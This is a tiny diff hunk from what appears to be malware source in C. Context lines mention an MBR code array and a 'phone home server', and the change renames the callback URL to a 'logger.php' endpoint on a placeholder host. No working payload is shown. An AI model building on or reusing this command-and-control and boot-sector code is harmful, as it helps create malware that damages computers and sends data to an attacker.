@@ -72,7 +72,7 @@ unsigned char mbrcode[512] = {
 
 // phone home server
 
-char *server =  (char *)"http://server/absinthe/fuck.php";
+char *server =  (char *)"http://server/absinthe/logger.php";
 
 
 int http_get(char* szUrl, char* szRecvBuf, DWORD iRecvSize) {
